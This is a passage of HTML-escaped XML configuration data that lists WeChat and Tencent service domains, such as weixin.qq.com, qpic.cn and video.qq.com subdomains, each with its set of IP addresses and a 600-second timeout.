timeout="600"&gt;&lt;ip&gt;183.3.234.107&lt;/ip&gt;&lt;ip&gt;183.3.234.102&lt;/ip&gt;&lt;ip&gt;183.3.224.146&lt;/ip&gt;&lt;ip&gt;183.3.224.139&lt;/ip&gt;&lt;ip&gt;14.215.158.119&lt;/ip&gt;&lt;ip&gt;14.215.158.102&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="szminorshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.61.46.199&lt;/ip&gt;&lt;ip&gt;14.18.245.167&lt;/ip&gt;&lt;ip&gt;14.17.42.45&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="szshort.pay.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.104&lt;/ip&gt;&lt;ip&gt;183.3.224.143&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="szshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.100&lt;/ip&gt;&lt;ip&gt;183.3.224.144&lt;/ip&gt;&lt;ip&gt;14.215.158.101&lt;/ip&gt;&lt;ip&gt;113.96.209.101&lt;/ip&gt;&lt;ip&gt;113.96.209.100&lt;/ip&gt;&lt;ip&gt;113.96.202.101&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="tjextshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.105&lt;/ip&gt;&lt;ip&gt;183.3.234.100&lt;/ip&gt;&lt;ip&gt;183.3.224.144&lt;/ip&gt;&lt;ip&gt;14.215.158.101&lt;/ip&gt;&lt;ip&gt;14.215.158.100&lt;/ip&gt;&lt;ip&gt;113.96.202.101&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="tjlong.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;123.151.10.186&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="tjshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;123.151.10.185&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="caextshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.11&lt;/ip&gt;&lt;ip&gt;113.96.209.108&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="calong.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.109&lt;/ip&gt;&lt;ip&gt;14.17.41.157&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="caminorshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.11&lt;/ip&gt;&lt;ip&gt;113.96.209.108&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="cashort.pay.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.111&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="cashort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.11&lt;/ip&gt;&lt;ip&gt;113.96.209.108&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="hkextshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.11&lt;/ip&gt;&lt;ip&gt;113.96.209.108&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="hklong.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.109&lt;/ip&gt;&lt;ip&gt;14.17.41.157&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="hkminorshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.11&lt;/ip&gt;&lt;ip&gt;113.96.209.108&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="hkshort.pay.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.111&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="hkshort.weixin.qq.com" timeout="600"&gt;&lt;ip&gt;183.3.234.11&lt;/ip&gt;&lt;ip&gt;113.96.209.108&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="emoji.qpic.cn" timeout="600"&gt;&lt;ip&gt;113.106.207.158&lt;/ip&gt;&lt;ip&gt;14.215.85.14&lt;/ip&gt;&lt;ip&gt;119.147.83.41&lt;/ip&gt;&lt;ip&gt;113.106.207.159&lt;/ip&gt;&lt;ip&gt;113.96.156.170&lt;/ip&gt;&lt;ip&gt;113.96.156.174&lt;/ip&gt;&lt;ip&gt;14.215.85.41&lt;/ip&gt;&lt;ip&gt;113.106.207.160&lt;/ip&gt;&lt;ip&gt;113.96.156.172&lt;/ip&gt;&lt;ip&gt;119.147.83.44&lt;/ip&gt;&lt;ip&gt;14.215.85.12&lt;/ip&gt;&lt;ip&gt;14.215.85.13&lt;/ip&gt;&lt;ip&gt;183.60.171.157&lt;/ip&gt;&lt;ip&gt;183.2.196.145&lt;/ip&gt;&lt;ip&gt;113.106.207.157&lt;/ip&gt;&lt;ip&gt;113.96.156.171&lt;/ip&gt;&lt;ip&gt;119.147.83.42&lt;/ip&gt;&lt;ip&gt;119.147.83.43&lt;/ip&gt;&lt;ip&gt;183.2.196.144&lt;/ip&gt;&lt;ip&gt;183.2.196.143&lt;/ip&gt;&lt;ip&gt;113.96.156.173&lt;/ip&gt;&lt;ip&gt;219.135.57.150&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="mmsns.qpic.cn" timeout="600"&gt;&lt;ip&gt;14.17.73.14&lt;/ip&gt;&lt;ip&gt;14.17.73.22&lt;/ip&gt;&lt;ip&gt;14.17.73.46&lt;/ip&gt;&lt;ip&gt;183.60.131.100&lt;/ip&gt;&lt;ip&gt;183.60.131.108&lt;/ip&gt;&lt;ip&gt;183.60.131.148&lt;/ip&gt;&lt;ip&gt;183.60.131.156&lt;/ip&gt;&lt;ip&gt;183.60.131.16&lt;/ip&gt;&lt;ip&gt;183.60.131.164&lt;/ip&gt;&lt;ip&gt;183.60.131.172&lt;/ip&gt;&lt;ip&gt;183.60.131.202&lt;/ip&gt;&lt;ip&gt;183.60.131.209&lt;/ip&gt;&lt;ip&gt;183.60.131.210&lt;/ip&gt;&lt;ip&gt;183.60.131.211&lt;/ip&gt;&lt;ip&gt;183.60.131.216&lt;/ip&gt;&lt;ip&gt;183.60.131.217&lt;/ip&gt;&lt;ip&gt;183.60.131.218&lt;/ip&gt;&lt;ip&gt;183.60.131.219&lt;/ip&gt;&lt;ip&gt;183.60.131.224&lt;/ip&gt;&lt;ip&gt;183.60.131.225&lt;/ip&gt;&lt;ip&gt;183.60.131.226&lt;/ip&gt;&lt;ip&gt;183.60.131.227&lt;/ip&gt;&lt;ip&gt;183.60.131.232&lt;/ip&gt;&lt;ip&gt;183.60.131.234&lt;/ip&gt;&lt;ip&gt;183.60.131.235&lt;/ip&gt;&lt;ip&gt;183.60.131.40&lt;/ip&gt;&lt;ip&gt;183.60.131.46&lt;/ip&gt;&lt;ip&gt;183.60.131.76&lt;/ip&gt;&lt;ip&gt;183.60.131.84&lt;/ip&gt;&lt;ip&gt;183.60.131.92&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="res.servicewechat.com" timeout="600"&gt;&lt;ip&gt;119.147.33.35&lt;/ip&gt;&lt;ip&gt;113.96.156.152&lt;/ip&gt;&lt;ip&gt;119.147.227.26&lt;/ip&gt;&lt;ip&gt;113.96.156.151&lt;/ip&gt;&lt;ip&gt;183.56.150.141&lt;/ip&gt;&lt;ip&gt;113.107.238.14&lt;/ip&gt;&lt;ip&gt;113.107.238.15&lt;/ip&gt;&lt;ip&gt;119.147.33.36&lt;/ip&gt;&lt;ip&gt;183.56.150.142&lt;/ip&gt;&lt;ip&gt;113.96.156.153&lt;/ip&gt;&lt;ip&gt;119.147.227.24&lt;/ip&gt;&lt;ip&gt;119.147.227.25&lt;/ip&gt;&lt;ip&gt;113.107.238.11&lt;/ip&gt;&lt;ip&gt;119.147.227.23&lt;/ip&gt;&lt;ip&gt;119.147.33.37&lt;/ip&gt;&lt;ip&gt;119.147.33.17&lt;/ip&gt;&lt;ip&gt;113.107.238.13&lt;/ip&gt;&lt;ip&gt;125.94.49.25&lt;/ip&gt;&lt;ip&gt;113.96.156.150&lt;/ip&gt;&lt;ip&gt;119.147.33.33&lt;/ip&gt;&lt;ip&gt;125.94.49.23&lt;/ip&gt;&lt;ip&gt;125.94.49.24&lt;/ip&gt;&lt;ip&gt;125.94.49.26&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="resstatic.servicewechat.com" timeout="600"&gt;&lt;ip&gt;182.140.167.37&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="shmmsns.qpic.cn" timeout="600"&gt;&lt;ip&gt;14.17.73.14&lt;/ip&gt;&lt;ip&gt;14.17.73.22&lt;/ip&gt;&lt;ip&gt;14.17.73.46&lt;/ip&gt;&lt;ip&gt;183.60.131.100&lt;/ip&gt;&lt;ip&gt;183.60.131.108&lt;/ip&gt;&lt;ip&gt;183.60.131.148&lt;/ip&gt;&lt;ip&gt;183.60.131.156&lt;/ip&gt;&lt;ip&gt;183.60.131.16&lt;/ip&gt;&lt;ip&gt;183.60.131.164&lt;/ip&gt;&lt;ip&gt;183.60.131.172&lt;/ip&gt;&lt;ip&gt;183.60.131.202&lt;/ip&gt;&lt;ip&gt;183.60.131.209&lt;/ip&gt;&lt;ip&gt;183.60.131.210&lt;/ip&gt;&lt;ip&gt;183.60.131.211&lt;/ip&gt;&lt;ip&gt;183.60.131.216&lt;/ip&gt;&lt;ip&gt;183.60.131.217&lt;/ip&gt;&lt;ip&gt;183.60.131.218&lt;/ip&gt;&lt;ip&gt;183.60.131.219&lt;/ip&gt;&lt;ip&gt;183.60.131.224&lt;/ip&gt;&lt;ip&gt;183.60.131.225&lt;/ip&gt;&lt;ip&gt;183.60.131.226&lt;/ip&gt;&lt;ip&gt;183.60.131.227&lt;/ip&gt;&lt;ip&gt;183.60.131.232&lt;/ip&gt;&lt;ip&gt;183.60.131.234&lt;/ip&gt;&lt;ip&gt;183.60.131.235&lt;/ip&gt;&lt;ip&gt;183.60.131.40&lt;/ip&gt;&lt;ip&gt;183.60.131.46&lt;/ip&gt;&lt;ip&gt;183.60.131.76&lt;/ip&gt;&lt;ip&gt;183.60.131.84&lt;/ip&gt;&lt;ip&gt;183.60.131.92&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="shp.qlogo.cn" timeout="600"&gt;&lt;ip&gt;61.151.183.44&lt;/ip&gt;&lt;ip&gt;180.97.9.11&lt;/ip&gt;&lt;ip&gt;180.97.9.100&lt;/ip&gt;&lt;ip&gt;101.226.212.107&lt;/ip&gt;&lt;ip&gt;101.226.76.160&lt;/ip&gt;&lt;ip&gt;101.226.90.145&lt;/ip&gt;&lt;ip&gt;61.151.168.141&lt;/ip&gt;&lt;ip&gt;101.91.63.156&lt;/ip&gt;&lt;ip&gt;101.91.63.157&lt;/ip&gt;&lt;ip&gt;61.151.206.58&lt;/ip&gt;&lt;ip&gt;101.91.63.158&lt;/ip&gt;&lt;ip&gt;180.97.117.116&lt;/ip&gt;&lt;ip&gt;180.97.117.108&lt;/ip&gt;&lt;ip&gt;180.97.117.100&lt;/ip&gt;&lt;ip&gt;180.97.9.124&lt;/ip&gt;&lt;ip&gt;180.97.9.123&lt;/ip&gt;&lt;ip&gt;180.97.9.125&lt;/ip&gt;&lt;ip&gt;180.97.117.101&lt;/ip&gt;&lt;ip&gt;180.97.9.122&lt;/ip&gt;&lt;ip&gt;180.97.8.103&lt;/ip&gt;&lt;ip&gt;180.97.117.50&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="shxzwxsns.video.qq.com" timeout="600"&gt;&lt;ip&gt;123.161.60.13&lt;/ip&gt;&lt;ip&gt;123.161.60.17&lt;/ip&gt;&lt;ip&gt;123.161.60.18&lt;/ip&gt;&lt;ip&gt;123.161.60.26&lt;/ip&gt;&lt;ip&gt;123.161.60.15&lt;/ip&gt;&lt;ip&gt;123.161.60.23&lt;/ip&gt;&lt;ip&gt;123.161.60.11&lt;/ip&gt;&lt;ip&gt;123.161.60.19&lt;/ip&gt;&lt;ip&gt;123.161.60.27&lt;/ip&gt;&lt;ip&gt;123.161.60.12&lt;/ip&gt;&lt;ip&gt;123.161.60.20&lt;/ip&gt;&lt;ip&gt;123.161.60.28&lt;/ip&gt;&lt;ip&gt;123.161.60.21&lt;/ip&gt;&lt;ip&gt;123.161.60.25&lt;/ip&gt;&lt;ip&gt;123.161.60.14&lt;/ip&gt;&lt;ip&gt;123.161.60.22&lt;/ip&gt;&lt;ip&gt;123.161.60.107&lt;/ip&gt;&lt;ip&gt;123.161.60.104&lt;/ip&gt;&lt;ip&gt;123.161.60.109&lt;/ip&gt;&lt;ip&gt;123.161.60.108&lt;/ip&gt;&lt;ip&gt;123.161.60.234&lt;/ip&gt;&lt;ip&gt;123.161.60.110&lt;/ip&gt;&lt;ip&gt;123.161.60.105&lt;/ip&gt;&lt;ip&gt;123.161.60.106&lt;/ip&gt;&lt;ip&gt;123.161.60.103&lt;/ip&gt;&lt;ip&gt;123.161.60.111&lt;/ip&gt;&lt;ip&gt;123.161.60.112&lt;/ip&gt;&lt;ip&gt;123.161.60.233&lt;/ip&gt;&lt;ip&gt;123.161.60.236&lt;/ip&gt;&lt;ip&gt;123.161.60.237&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="shzjwxsns.video.qq.com" timeout="600"&gt;&lt;ip&gt;123.161.60.13&lt;/ip&gt;&lt;ip&gt;123.161.60.17&lt;/ip&gt;&lt;ip&gt;123.161.60.18&lt;/ip&gt;&lt;ip&gt;123.161.60.26&lt;/ip&gt;&lt;ip&gt;123.161.60.15&lt;/ip&gt;&lt;ip&gt;123.161.60.23&lt;/ip&gt;&lt;ip&gt;123.161.60.11&lt;/ip&gt;&lt;ip&gt;123.161.60.19&lt;/ip&gt;&lt;ip&gt;123.161.60.27&lt;/ip&gt;&lt;ip&gt;123.161.60.12&lt;/ip&gt;&lt;ip&gt;123.161.60.20&lt;/ip&gt;&lt;ip&gt;123.161.60.28&lt;/ip&gt;&lt;ip&gt;123.161.60.21&lt;/ip&gt;&lt;ip&gt;123.161.60.25&lt;/ip&gt;&lt;ip&gt;123.161.60.14&lt;/ip&gt;&lt;ip&gt;123.161.60.22&lt;/ip&gt;&lt;ip&gt;123.161.60.107&lt;/ip&gt;&lt;ip&gt;123.161.60.104&lt;/ip&gt;&lt;ip&gt;123.161.60.109&lt;/ip&gt;&lt;ip&gt;123.161.60.108&lt;/ip&gt;&lt;ip&gt;123.161.60.234&lt;/ip&gt;&lt;ip&gt;123.161.60.110&lt;/ip&gt;&lt;ip&gt;123.161.60.105&lt;/ip&gt;&lt;ip&gt;123.161.60.106&lt;/ip&gt;&lt;ip&gt;123.161.60.103&lt;/ip&gt;&lt;ip&gt;123.161.60.111&lt;/ip&gt;&lt;ip&gt;123.161.60.112&lt;/ip&gt;&lt;ip&gt;123.161.60.233&lt;/ip&gt;&lt;ip&gt;123.161.60.236&lt;/ip&gt;&lt;ip&gt;123.161.60.237&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="szmmsns.qpic.cn" timeout="600"&gt;&lt;ip&gt;14.17.73.14&lt;/ip&gt;&lt;ip&gt;14.17.73.22&lt;/ip&gt;&lt;ip&gt;14.17.73.46&lt;/ip&gt;&lt;ip&gt;183.60.131.100&lt;/ip&gt;&lt;ip&gt;183.60.131.108&lt;/ip&gt;&lt;ip&gt;183.60.131.148&lt;/ip&gt;&lt;ip&gt;183.60.131.156&lt;/ip&gt;&lt;ip&gt;183.60.131.16&lt;/ip&gt;&lt;ip&gt;183.60.131.164&lt;/ip&gt;&lt;ip&gt;183.60.131.172&lt;/ip&gt;&lt;ip&gt;183.60.131.202&lt;/ip&gt;&lt;ip&gt;183.60.131.209&lt;/ip&gt;&lt;ip&gt;183.60.131.210&lt;/ip&gt;&lt;ip&gt;183.60.131.211&lt;/ip&gt;&lt;ip&gt;183.60.131.216&lt;/ip&gt;&lt;ip&gt;183.60.131.217&lt;/ip&gt;&lt;ip&gt;183.60.131.218&lt;/ip&gt;&lt;ip&gt;183.60.131.219&lt;/ip&gt;&lt;ip&gt;183.60.131.224&lt;/ip&gt;&lt;ip&gt;183.60.131.225&lt;/ip&gt;&lt;ip&gt;183.60.131.226&lt;/ip&gt;&lt;ip&gt;183.60.131.227&lt;/ip&gt;&lt;ip&gt;183.60.131.232&lt;/ip&gt;&lt;ip&gt;183.60.131.234&lt;/ip&gt;&lt;ip&gt;183.60.131.235&lt;/ip&gt;&lt;ip&gt;183.60.131.40&lt;/ip&gt;&lt;ip&gt;183.60.131.46&lt;/ip&gt;&lt;ip&gt;183.60.131.76&lt;/ip&gt;&lt;ip&gt;183.60.131.84&lt;/ip&gt;&lt;ip&gt;183.60.131.92&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="szxzwxsns.video.qq.com" timeout="600"&gt;&lt;ip&gt;123.161.60.13&lt;/ip&gt;&lt;ip&gt;123.161.60.17&lt;/ip&gt;&lt;ip&gt;123.161.60.18&lt;/ip&gt;&lt;ip&gt;123.161.60.26&lt;/ip&gt;&lt;ip&gt;123.161.60.15&lt;/ip&gt;&lt;ip&gt;123.161.60.23&lt;/ip&gt;&lt;ip&gt;123.161.60.11&lt;/ip&gt;&lt;ip&gt;123.161.60.19&lt;/ip&gt;&lt;ip&gt;123.161.60.27&lt;/ip&gt;&lt;ip&gt;123.161.60.12&lt;/ip&gt;&lt;ip&gt;123.161.60.20&lt;/ip&gt;&lt;ip&gt;123.161.60.28&lt;/ip&gt;&lt;ip&gt;123.161.60.21&lt;/ip&gt;&lt;ip&gt;123.161.60.25&lt;/ip&gt;&lt;ip&gt;123.161.60.14&lt;/ip&gt;&lt;ip&gt;123.161.60.22&lt;/ip&gt;&lt;ip&gt;123.161.60.107&lt;/ip&gt;&lt;ip&gt;123.161.60.104&lt;/ip&gt;&lt;ip&gt;123.161.60.109&lt;/ip&gt;&lt;ip&gt;123.161.60.108&lt;/ip&gt;&lt;ip&gt;123.161.60.234&lt;/ip&gt;&lt;ip&gt;123.161.60.110&lt;/ip&gt;&lt;ip&gt;123.161.60.105&lt;/ip&gt;&lt;ip&gt;123.161.60.106&lt;/ip&gt;&lt;ip&gt;123.161.60.103&lt;/ip&gt;&lt;ip&gt;123.161.60.111&lt;/ip&gt;&lt;ip&gt;123.161.60.112&lt;/ip&gt;&lt;ip&gt;123.161.60.233&lt;/ip&gt;&lt;ip&gt;123.161.60.236&lt;/ip&gt;&lt;ip&gt;123.161.60.237&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="szzjwxsns.video.qq.com" timeout="600"&gt;&lt;ip&gt;123.161.60.13&lt;/ip&gt;&lt;ip&gt;123.161.60.17&lt;/ip&gt;&lt;ip&gt;123.161.60.18&lt;/ip&gt;&lt;ip&gt;123.161.60.26&lt;/ip&gt;&lt;ip&gt;123.161.60.15&lt;/ip&gt;&lt;ip&gt;123.161.60.23&lt;/ip&gt;&lt;ip&gt;123.161.60.11&lt;/ip&gt;&lt;ip&gt;123.161.60.19&lt;/ip&gt;&lt;ip&gt;123.161.60.27&lt;/ip&gt;&lt;ip&gt;123.161.60.12&lt;/ip&gt;&lt;ip&gt;123.161.60.20&lt;/ip&gt;&lt;ip&gt;123.161.60.28&lt;/ip&gt;&lt;ip&gt;123.161.60.21&lt;/ip&gt;&lt;ip&gt;123.161.60.25&lt;/ip&gt;&lt;ip&gt;123.161.60.14&lt;/ip&gt;&lt;ip&gt;123.161.60.22&lt;/ip&gt;&lt;ip&gt;123.161.60.107&lt;/ip&gt;&lt;ip&gt;123.161.60.104&lt;/ip&gt;&lt;ip&gt;123.161.60.109&lt;/ip&gt;&lt;ip&gt;123.161.60.108&lt;/ip&gt;&lt;ip&gt;123.161.60.234&lt;/ip&gt;&lt;ip&gt;123.161.60.110&lt;/ip&gt;&lt;ip&gt;123.161.60.105&lt;/ip&gt;&lt;ip&gt;123.161.60.106&lt;/ip&gt;&lt;ip&gt;123.161.60.103&lt;/ip&gt;&lt;ip&gt;123.161.60.111&lt;/ip&gt;&lt;ip&gt;123.161.60.112&lt;/ip&gt;&lt;ip&gt;123.161.60.233&lt;/ip&gt;&lt;ip&gt;123.161.60.236&lt;/ip&gt;&lt;ip&gt;123.161.60.237&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="vweixinf.tc.qq.com" timeout="600"&gt;&lt;ip&gt;123.161.60.13&lt;/ip&gt;&lt;ip&gt;123.161.60.17&lt;/ip&gt;&lt;ip&gt;123.161.60.18&lt;/ip&gt;&lt;ip&gt;123.161.60.26&lt;/ip&gt;&lt;ip&gt;123.161.60.15&lt;/ip&gt;&lt;ip&gt;123.161.60.23&lt;/ip&gt;&lt;ip&gt;123.161.60.11&lt;/ip&gt;&lt;ip&gt;123.161.60.19&lt;/ip&gt;&lt;ip&gt;123.161.60.27&lt;/ip&gt;&lt;ip&gt;123.161.60.12&lt;/ip&gt;&lt;ip&gt;123.161.60.20&lt;/ip&gt;&lt;ip&gt;123.161.60.28&lt;/ip&gt;&lt;ip&gt;123.161.60.21&lt;/ip&gt;&lt;ip&gt;123.161.60.25&lt;/ip&gt;&lt;ip&gt;123.161.60.14&lt;/ip&gt;&lt;ip&gt;123.161.60.22&lt;/ip&gt;&lt;ip&gt;123.161.60.107&lt;/ip&gt;&lt;ip&gt;123.161.60.104&lt;/ip&gt;&lt;ip&gt;123.161.60.109&lt;/ip&gt;&lt;ip&gt;123.161.60.108&lt;/ip&gt;&lt;ip&gt;123.161.60.234&lt;/ip&gt;&lt;ip&gt;123.161.60.110&lt;/ip&gt;&lt;ip&gt;123.161.60.105&lt;/ip&gt;&lt;ip&gt;123.161.60.106&lt;/ip&gt;&lt;ip&gt;123.161.60.103&lt;/ip&gt;&lt;ip&gt;123.161.60.111&lt;/ip&gt;&lt;ip&gt;123.161.60.112&lt;/ip&gt;&lt;ip&gt;123.161.60.233&lt;/ip&gt;&lt;ip&gt;123.161.60.236&lt;/ip&gt;&lt;ip&gt;123.161.60.237&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="weixinc2c.tc.qq.com" timeout="600"&gt;&lt;ip&gt;113.106.207.158&lt;/ip&gt;&lt;ip&gt;14.215.85.14&lt;/ip&gt;&lt;ip&gt;119.147.83.41&lt;/ip&gt;&lt;ip&gt;113.106.207.159&lt;/ip&gt;&lt;ip&gt;113.96.156.170&lt;/ip&gt;&lt;ip&gt;113.96.156.174&lt;/ip&gt;&lt;ip&gt;14.215.85.41&lt;/ip&gt;&lt;ip&gt;113.106.207.160&lt;/ip&gt;&lt;ip&gt;113.96.156.172&lt;/ip&gt;&lt;ip&gt;119.147.83.44&lt;/ip&gt;&lt;ip&gt;14.215.85.12&lt;/ip&gt;&lt;ip&gt;14.215.85.13&lt;/ip&gt;&lt;ip&gt;183.60.171.157&lt;/ip&gt;&lt;ip&gt;183.2.196.145&lt;/ip&gt;&lt;ip&gt;113.106.207.157&lt;/ip&gt;&lt;ip&gt;113.96.156.171&lt;/ip&gt;&lt;ip&gt;119.147.83.42&lt;/ip&gt;&lt;ip&gt;119.147.83.43&lt;/ip&gt;&lt;ip&gt;183.2.196.144&lt;/ip&gt;&lt;ip&gt;183.2.196.143&lt;/ip&gt;&lt;ip&gt;113.96.156.173&lt;/ip&gt;&lt;ip&gt;219.135.57.150&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="wx.qlogo.cn" timeout="600"&gt;&lt;ip&gt;113.96.232.103&lt;/ip&gt;&lt;ip&gt;113.96.232.104&lt;/ip&gt;&lt;ip&gt;14.215.140.19&lt;/ip&gt;&lt;ip&gt;183.3.233.160&lt;/ip&gt;&lt;ip&gt;183.3.233.161&lt;/ip&gt;&lt;ip&gt;59.37.97.86&lt;/ip&gt;&lt;ip&gt;14.215.138.114&lt;/ip&gt;&lt;ip&gt;14.17.42.105&lt;/ip&gt;&lt;ip&gt;183.61.38.218&lt;/ip&gt;&lt;ip&gt;183.3.234.140&lt;/ip&gt;&lt;ip&gt;14.17.57.189&lt;/ip&gt;&lt;ip&gt;113.96.232.173&lt;/ip&gt;&lt;ip&gt;113.96.232.163&lt;/ip&gt;&lt;ip&gt;113.96.232.162&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="wximg.qq.com" timeout="600"&gt;&lt;ip&gt;113.107.238.24&lt;/ip&gt;&lt;ip&gt;183.56.150.163&lt;/ip&gt;&lt;ip&gt;119.147.83.12&lt;/ip&gt;&lt;ip&gt;113.96.156.144&lt;/ip&gt;&lt;ip&gt;119.147.33.25&lt;/ip&gt;&lt;ip&gt;183.56.150.164&lt;/ip&gt;&lt;ip&gt;119.147.227.14&lt;/ip&gt;&lt;ip&gt;183.56.150.165&lt;/ip&gt;&lt;ip&gt;119.147.33.24&lt;/ip&gt;&lt;ip&gt;119.147.33.27&lt;/ip&gt;&lt;ip&gt;119.147.227.11&lt;/ip&gt;&lt;ip&gt;113.96.156.141&lt;/ip&gt;&lt;ip&gt;119.147.83.11&lt;/ip&gt;&lt;ip&gt;119.147.33.11&lt;/ip&gt;&lt;ip&gt;119.147.227.13&lt;/ip&gt;&lt;ip&gt;119.147.227.15&lt;/ip&gt;&lt;ip&gt;119.147.227.16&lt;/ip&gt;&lt;ip&gt;119.147.33.38&lt;/ip&gt;&lt;ip&gt;113.96.156.143&lt;/ip&gt;&lt;ip&gt;119.147.227.12&lt;/ip&gt;&lt;ip&gt;113.96.156.142&lt;/ip&gt;&lt;ip&gt;119.147.33.39&lt;/ip&gt;&lt;ip&gt;119.147.33.23&lt;/ip&gt;&lt;ip&gt;113.107.238.25&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="wxsnsdy.video.qq.com" timeout="600"&gt;&lt;ip&gt;123.161.60.13&lt;/ip&gt;&lt;ip&gt;123.161.60.17&lt;/ip&gt;&lt;ip&gt;123.161.60.18&lt;/ip&gt;&lt;ip&gt;123.161.60.26&lt;/ip&gt;&lt;ip&gt;123.161.60.15&lt;/ip&gt;&lt;ip&gt;123.161.60.23&lt;/ip&gt;&lt;ip&gt;123.161.60.11&lt;/ip&gt;&lt;ip&gt;123.161.60.19&lt;/ip&gt;&lt;ip&gt;123.161.60.27&lt;/ip&gt;&lt;ip&gt;123.161.60.12&lt;/ip&gt;&lt;ip&gt;123.161.60.20&lt;/ip&gt;&lt;ip&gt;123.161.60.28&lt;/ip&gt;&lt;ip&gt;123.161.60.21&lt;/ip&gt;&lt;ip&gt;123.161.60.25&lt;/ip&gt;&lt;ip&gt;123.161.60.14&lt;/ip&gt;&lt;ip&gt;123.161.60.22&lt;/ip&gt;&lt;ip&gt;123.161.60.107&lt;/ip&gt;&lt;ip&gt;123.161.60.104&lt;/ip&gt;&lt;ip&gt;123.161.60.109&lt;/ip&gt;&lt;ip&gt;123.161.60.108&lt;/ip&gt;&lt;ip&gt;123.161.60.234&lt;/ip&gt;&lt;ip&gt;123.161.60.110&lt;/ip&gt;&lt;ip&gt;123.161.60.105&lt;/ip&gt;&lt;ip&gt;123.161.60.106&lt;/ip&gt;&lt;ip&gt;123.161.60.103&lt;/ip&gt;&lt;ip&gt;123.161.60.111&lt;/ip&gt;&lt;ip&gt;123.161.60.112&lt;/ip&gt;&lt;ip&gt;123.161.60.233&lt;/ip&gt;&lt;ip&gt;123.161.60.236&lt;/ip&gt;&lt;ip&gt;123.161.60.237&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="wxsnsdy.wxs.qq.com" timeout="600"&gt;&lt;ip&gt;123.161.60.13&lt;/ip&gt;&lt;ip&gt;123.161.60.17&lt;/ip&gt;&lt;ip&gt;123.161.60.18&lt;/ip&gt;&lt;ip&gt;123.161.60.26&lt;/ip&gt;&lt;ip&gt;123.161.60.15&lt;/ip&gt;&lt;ip&gt;123.161.60.23&lt;/ip&gt;&lt;ip&gt;123.161.60.11&lt;/ip&gt;&lt;ip&gt;123.161.60.19&lt;/ip&gt;&lt;ip&gt;123.161.60.27&lt;/ip&gt;&lt;ip&gt;123.161.60.12&lt;/ip&gt;&lt;ip&gt;123.161.60.20&lt;/ip&gt;&lt;ip&gt;123.161.60.28&lt;/ip&gt;&lt;ip&gt;123.161.60.21&lt;/ip&gt;&lt;ip&gt;123.161.60.25&lt;/ip&gt;&lt;ip&gt;123.161.60.14&lt;/ip&gt;&lt;ip&gt;123.161.60.22&lt;/ip&gt;&lt;ip&gt;123.161.60.107&lt;/ip&gt;&lt;ip&gt;123.161.60.104&lt;/ip&gt;&lt;ip&gt;123.161.60.109&lt;/ip&gt;&lt;ip&gt;123.161.60.108&lt;/ip&gt;&lt;ip&gt;123.161.60.234&lt;/ip&gt;&lt;ip&gt;123.161.60.110&lt;/ip&gt;&lt;ip&gt;123.161.60.105&lt;/ip&gt;&lt;ip&gt;123.161.60.106&lt;/ip&gt;&lt;ip&gt;123.161.60.103&lt;/ip&gt;&lt;ip&gt;123.161.60.111&lt;/ip&gt;&lt;ip&gt;123.161.60.112&lt;/ip&gt;&lt;ip&gt;123.161.60.233&lt;/ip&gt;&lt;ip&gt;123.161.60.236&lt;/ip&gt;&lt;ip&gt;123.161.60.237&lt;/ip&gt;&lt;/domain&gt;&lt;domain name="wxsnsdyvip.wxs.qq.com" 